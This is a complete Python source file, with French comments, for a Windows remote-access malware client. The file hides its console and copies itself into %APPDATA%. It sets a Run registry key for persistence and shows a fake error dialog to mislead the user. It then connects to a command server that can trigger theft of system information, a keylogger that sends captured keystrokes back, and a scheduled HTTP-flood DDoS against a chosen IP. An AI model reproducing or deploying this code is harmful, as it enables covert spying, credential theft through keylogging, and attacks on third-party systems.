from shutil import SameFileError, copyfile
from datetime import datetime
from threading import Thread
from platform import node
from time import sleep
from re import match
import subprocess
import sys
import winreg
import ctypes
import argparse
import socket
import os

try:
    from pynput import keyboard
    import requests
except ModuleNotFoundError:
    print("Pynput et/ou requests non-installé")
    sleep(2)
    exit()


class Client:
    def __init__(self):
        """On initialise la class Client avec une l'ip du serveur, le port du serveur, un socket
            ainsi que l'écoute qui est en True
        """
        
        # You can modify IP and PORT here
        self.ip = "192.168.1.52"
        self.port = 666
        
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listening = True
        self.node = str(node())

    def prepare_malware(self):
        """Fonction qui essaye de copier le malware dans %APPDATA%.
            Si le malware est executé depuis %APPDATA% on quitte la fonction de copie
            Sinon on le copie dans %APPDATA%, on créé une clé de registre pour le rendre persistant
                On essaye ensuite d'allez dans le répertoire %APPDATA% et de lancer le nouveau malware
                et de fermer l'ancien
        """
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

        try:
            self.path_appdata = os.path.expandvars('%APPDATA%')
            client_name = os.path.basename(sys.argv[0])
            current_full_path = os.path.abspath(sys.argv[0])
            copyfile(current_full_path, self.path_appdata + "\\" + client_name)
            key = winreg.HKEY_CURRENT_USER
            key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
            open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(open_key, "client", 0, winreg.REG_SZ,
                              self.path_appdata + "\\" + client_name)
            winreg.CloseKey(open_key)

            try:
                os.chdir(self.path_appdata)
                os.popen(client_name)
                ctypes.windll.user32.MessageBoxW(0, "This program is not compatible with your system.", "Error", 0x10)
            except WindowsError:
                pass
            except OSError:
                pass

            exit()

        except SameFileError:
            pass
        except FileNotFoundError:
            pass

    def connect_socket(self):
        """Fonction qui essaye de se connecter au serveur via l'adresse et le port défini plus haut
        Si aucun serveur n'écoute sur cette adresse et ce port, le client se ferme
        """
        try:
            self.s.connect((self.ip, self.port))
        except ConnectionRefusedError:
            self.listening = False

    def get_sys_info(self):
        """Fonction qui envoie les informations système de la machine au serveur
        """
        self.s.send(
            ("<" + self.node + "> : " + "Récupération des informations systèmes ...\n").encode("utf-8"))
        try:
            system_info = subprocess.Popen("systeminfo", shell=True, stdout=subprocess.PIPE)
            system_info.wait()
            system_info_response = str(system_info.stdout.read().strip(), "utf-8").split("\n")
            with open(self.path_appdata + "\\sysinfo.txt", "w") as sys_info_file:
                sys_info_file.write("\n")
                sys_info_file.write("-------------------------------\n")
                sys_info_file.write("SYS_LOGS DE " + self.node + "\n")
                sys_info_file.write("-------------------------------\n")
                for line in system_info_response:
                    sys_info_file.write(line)
                sys_info_file.write("\n")
            with open(self.path_appdata + "\\sysinfo.txt", "r") as sys_info_file:
                self.s.send(sys_info_file.read().encode("utf-8"))
        except subprocess.CalledProcessError:
            self.s.send(
                ("<" + self.node + "> : " + "Impossible de récupérer les informations systèmes\n").encode(
                    "utf-8"))
        except OSError:
            self.s.send(
                ("<" + self.node + "> : " + "Impossible de récupérer les informations systèmes\n").encode(
                    "utf-8"))

    def listen_command(self):
        """Fonction qui écoute les commandes envoyées par le serveur :
        Tant que le client est en écoute :
            On teste la commande reçue avec les différentes commandes sans_arguments.
            Si une commande correspond, on démarre la fonction qui gère cette commande
        """
        while self.listening:
            try:
                self.command = self.s.recv(1024).decode("utf-8")
                self.command_without_argument = \
                    self.command[0:self.command.find("(")+1] + self.command[self.command.find(")"):]

                if self.command == "get_sys_info()":
                    self.get_sys_info()
                elif self.command == "keylogger_start()":
                    self.keylogger_start()
                elif self.command == "keylogger_stop()":
                    self.keylogger_stop()
                elif self.command_without_argument == "keylogger_dump()":
                    self.keylogger_dump()
                elif self.command_without_argument == "ddos()":
                    self.ddos()
            except ConnectionResetError:
                self.listening = False

    def keylogger_start(self):
        """Fonction qui va démarrer la classe Keylogger
        """
        self.s.send(("<" + self.node + "> : " + "Keylogger démarré\n").encode("utf-8"))
        self.keylogger_thread = Keylogger()
        self.keylogger_thread.start()

    def keylogger_stop(self):
        """Fonction qui a pur but d'arrêter le keylogger et d'écrire chaque frappe de clavier dans
        le fichier keylogs.txt
        Il gère également si le keylogger n'a jamais été démarré
        """
        try:
            if self.keylogger_thread.log:
                self.keylogger_thread.stop()
                with open(self.path_appdata + "\\keylogs.txt", "w") as keylogs_file:
                    for key in self.keylogger_thread.log:
                        if key in self.keylogger_thread.substitution.keys():
                            key_value = self.keylogger_thread.substitution[key]
                            keylogs_file.write(str(key_value))
                        else:
                            keylogs_file.write(str(key))
                self.s.send(("<" + self.node + "> : " + "Keylogger arrêté\n").encode("utf-8"))
                self.keylogger_thread.log = []
            else:
                self.s.send(("<" + self.node + "> : " + "Aucun keylogger n'a été démarré\n").encode("utf-8"))
        except AttributeError:
            self.s.send(("<" + self.node + "> : " + "Aucun keylogger n'a été démarré\n").encode("utf-8"))

    def keylogger_dump(self):
        """Fonction qui permet de renvoyer les logs du clavier
        On créer un fichier temporaire et on écris l'en-tête
        Si la commande contient des arguments, on récupère l'argument.
            On récupère le nombre de ligne passé en argument dans le fichier de logs par la fin
            On écris ensuite dans le fichier temporaire les lignes récupérées puis on l'envoi
        Sinon si la commande ne contient pas d'argument
            On récupère le contenu du fichier de logs et on l'écris dans le fichier temporaire puis on l'envoi
        Le fichier temporaire est ensuite supprimé
        """
        with open(self.path_appdata + "\\temp_keylogs.txt", "w") as temp_keylogs_file:
            temp_keylogs_file.write("\n")
            temp_keylogs_file.write("-------------------------------\n")
            temp_keylogs_file.write("KEYS_LOGS DE " + self.node + "\n")
            temp_keylogs_file.write("-------------------------------\n")
        try:
            if self.command != "keylogger_dump()":
                try:
                    argument = abs(int((self.command[self.command.find("(") + 1:-1]).strip()))
                    with open(self.path_appdata + "\\keylogs.txt", "r") as keylogs_file:
                        file_lines = list(keylogs_file.readlines())
                        file_lines = file_lines[-argument:]
                    with open(self.path_appdata + "\\temp_keylogs.txt", "a") as temp_keylogs_file:
                        for line in file_lines:
                            temp_keylogs_file.write(line)
                        temp_keylogs_file.write("\n")
                    with open(self.path_appdata + "\\temp_keylogs.txt", "r") as temp_keylogs_file:
                        self.s.send(temp_keylogs_file.read().encode("utf-8"))
                except ValueError:
                    self.s.send(("<" + self.node + "> : " + "Mauvais paramètre pour la commande : keylogger_dump("
                                                            "lines)\n").encode("utf-8"))
            else:
                with open(self.path_appdata + "\\keylogs.txt", "r") as keylogs_file:
                    with open(self.path_appdata + "\\temp_keylogs.txt", "a") as temp_keylogs_file:
                        temp_keylogs_file.write(keylogs_file.read())

                with open(self.path_appdata + "\\temp_keylogs.txt", "r") as temp_keylogs_file:
                    self.s.send(temp_keylogs_file.read().encode("utf-8"))
        except FileNotFoundError:
            self.s.send(("<" + self.node + "> : " + "Aucune frappe de claviers trouvées\n").encode("utf-8"))
        try:
            os.remove(self.path_appdata + "\\temp_keylogs.txt")
        except FileNotFoundError:
            pass

    def ddos(self):
        """Fonction qui récupère chaque argument présent dans la commande et qui lance la ddos si
        tous les arguments sont présents."""
        arguments = list((self.command[self.command.find("(") + 1: self.command.find(")")]).split(","))
        try:
            target_ip = arguments[0].strip()
            target_datetime = arguments[1].strip()
            target_duration = arguments[2].strip()
            self.ddos_thread = Ddos(target_ip, target_datetime, target_duration, self.s, self.node)
            self.ddos_thread.start()
        except IndexError:
            self.s.send(("<" + self.node + "> : " + "Commande incomplète pour la commande : ddos(ip, "
                                                               "datetime[yyyy-mm-dd hh:mm], "
                                                               "duration[s])\n").encode("utf-8"))


class Keylogger(keyboard.Listener):
    def __init__(self):
        """On hérite de keyboard.Listener
        On créé une liste pour les touches que l'on va récupérer
        On créé un dictionnaire qui va permettre de remplacer les touches récupérées par un nom correct
        """
        super().__init__(on_press=self.log_key)
        self.log = []
        self.substitution = {
            "Key.enter": "[ENTER]\n",
            "Key.backspace": "[BACKSPACE]",
            "Key.space": " ",
            "Key.alt_l": "[ALT]",
            "Key.tab": "[TAB]",
            "Key.delete": "[DEL]",
            "Key.ctrl_l": "[CTRL]",
            "Key.left": "[LEFT ARROW]",
            "Key.right": "[RIGHT ARROW]",
            "Key.shift": "[SHIFT]",
            "Key.shift_r": "[SHIFT]",
            "\\x13": "[CTRL-S]",
            "\\x17": "[CTRL-W]",
            "Key.caps_lock": "[CAPS LK]",
            "\\x01": "[CTRL-A]",
            "Key.cmd": "[WINDOWS KEY]",
            "Key.print_screen": "[PRNT SCR]",
            "\\x03": "[CTRL-C]",
            "\\x16": "[CTRL-V]"
        }

    def log_key(self, key):
        """Fonction qui écoute les touches pressée et les ajoutes dans la liste log
        """
        try:
            self.log.append(key.char)
        except AttributeError:
            self.log.append('{0}'.format(key))


class Ddos(Thread):
    def __init__(self, target_ip, target_datetime, target_duration, s, node):
        """On hérite de threading.Thread et on récupère les différentes variable dont on a besoin:
        ip cible / date de l'attaque / durée de l'attaque / le socket / le nom de la machine
        """
        super().__init__()
        self.target_ip = target_ip
        self.target_datetime = target_datetime
        self.target_duration = target_duration
        self.s = s
        self.node = node

    def run(self):
        """Fonction qui va vérifier chaque argument de la commande ddos un par un
            1. Si la date est bel et bien un int.
            2. Si la date est postérieure à la date d'aujourd'hui
            3. Si la date est dans un format valide via un regex
                Si la date a passé tous les tests, on boucle tant qu'on est pas à la date indiquée
            4. On vérifie ensuite si la durée de ddos est bien un int
            5. On lance le thread de décompte pour la durée

        Si l'addresse IP / le nom de domaine est injoignale on affiche que l'ip / le nom de domaine
        est erroné
        Le dddos s'arrête quand le décompte est terminé
        """
        datetime_now = str(datetime.today())[:str(datetime.today()).find(".") - 3]
        datetime_regex = "^\d\d\d\d-(0?[1-9]|1[0-2])-(0?[1-9]|[12][0-9]|3[01]) (2[0-3]|[01]?[0-9]):([0-9]|[0-5][0-9])$"

        try:
            if self.target_datetime == "":
                self.target_datetime = datetime_now

            target_datetime_int = int(((self.target_datetime.replace("-", "")).replace(" ", "")).replace(":", ""))
            datetime_now_int = int(((datetime_now.replace("-", "")).replace(" ", "")).replace(":", ""))
            if target_datetime_int >= datetime_now_int:
                if match(datetime_regex, self.target_datetime):

                    while self.target_datetime != datetime_now:
                        datetime_now = str(datetime.today())[:str(datetime.today()).find(".") - 3]

                    try:
                        self.target_duration = int(self.target_duration)
                        self.ddos_counter_thread = DdosCounter(abs(self.target_duration))
                        self.ddos_counter_thread.start()

                        self.s.send(("<" + self.node + "> : " + "Démarrage du ddos vers "
                                     + self.target_ip + " pour " + str(self.target_duration)
                                     + " seconde(s)\n").encode("utf-8"))

                        while self.ddos_counter_thread.target_duration != 0 and self.target_duration != 0:
                            try:
                                requests.get("http://" + self.target_ip)
                            except requests.exceptions.ConnectionError:
                                self.s.send(("<" + self.node + "> : " + "Erreur de connexion/"
                                                                                   "IP invalide\n").encode("utf-8"))
                                self.target_duration = 0
                    except ValueError:
                        self.s.send(("<" + self.node + "> : " + "La durée du ddos est "
                                                                           "invalide\n").encode("utf-8"))
                else:
                    self.s.send(("<" + self.node + "> : " + "La date est invalide\n").encode("utf-8"))
            else:
                self.s.send(("<" + self.node + "> : " + "La date est invalide\n").encode("utf-8"))
        except ValueError:
            self.s.send(("<" + self.node + "> : " + "La date est invalide\n").encode("utf-8"))

        self.s.send(("<" + self.node + "> : " + "Fin du ddos vers "
                     + str(self.target_ip) + "\n").encode("utf-8"))


class DdosCounter(Thread):
    def __init__(self, target_duration):
        """On hérite de threading.Thread et on récupère le temps de ddos
        """
        super().__init__()
        self.target_duration = target_duration

    def run(self):
        """On attend le temps de ddos puis on le passe à 0 une fois le temps écoulé
        """
        sleep(int(self.target_duration))
        self.target_duration = 0


client = Client()
client.prepare_malware()
client.connect_socket()
client.listen_command()

